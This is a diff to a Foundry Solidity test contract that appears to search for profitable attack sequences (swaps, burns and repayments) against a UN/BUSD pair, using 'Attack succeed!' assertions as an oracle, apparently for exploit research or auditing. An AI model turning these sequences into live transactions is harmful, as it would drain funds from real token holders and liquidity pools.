@@ -115,7 +115,9 @@ contract UNTest is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfbusdattacker);
+        emit log_named_uint("FinalBalance", busd.balanceOf(attacker));
         return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
     }
 
@@ -177,7 +179,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt1, amt2);
         swap_pair_attacker_un_busd(amt3, amt4);
         payback_busd_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -197,7 +199,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt2, amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -217,7 +219,7 @@ contract UNTest is Test, BlockLoader {
         burn_un_pair(amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -235,7 +237,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_un_busd(amt1, amt2);
         swap_pair_attacker_busd_un(amt3, amt4);
         payback_un_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -255,7 +257,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_un_busd(amt2, amt3);
         swap_pair_attacker_busd_un(amt4, amt5);
         payback_un_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -275,7 +277,7 @@ contract UNTest is Test, BlockLoader {
         burn_un_pair(amt3);
         swap_pair_attacker_busd_un(amt4, amt5);
         payback_un_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -299,7 +301,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt5, amt6);
         swap_pair_attacker_un_busd(amt7, amt8);
         payback_busd_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -325,7 +327,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt6, amt7);
         swap_pair_attacker_un_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -351,7 +353,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt6, amt7);
         swap_pair_attacker_un_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -377,7 +379,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt6, amt7);
         swap_pair_attacker_un_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -403,7 +405,7 @@ contract UNTest is Test, BlockLoader {
         burn_un_pair(amt7);
         swap_pair_attacker_un_busd(amt8, amt9);
         payback_busd_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -427,7 +429,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_un_busd(amt5, amt6);
         swap_pair_attacker_busd_un(amt7, amt8);
         payback_un_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -453,7 +455,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_un_busd(amt6, amt7);
         swap_pair_attacker_busd_un(amt8, amt9);
         payback_un_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -479,7 +481,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_un_busd(amt6, amt7);
         swap_pair_attacker_busd_un(amt8, amt9);
         payback_un_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -505,7 +507,7 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_un_busd(amt6, amt7);
         swap_pair_attacker_busd_un(amt8, amt9);
         payback_un_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -531,7 +533,7 @@ contract UNTest is Test, BlockLoader {
         burn_un_pair(amt7);
         swap_pair_attacker_busd_un(amt8, amt9);
         payback_un_owner(amt10);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -577,7 +579,7 @@ contract UNTest is Test, BlockLoader {
         burn_un_pair(amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
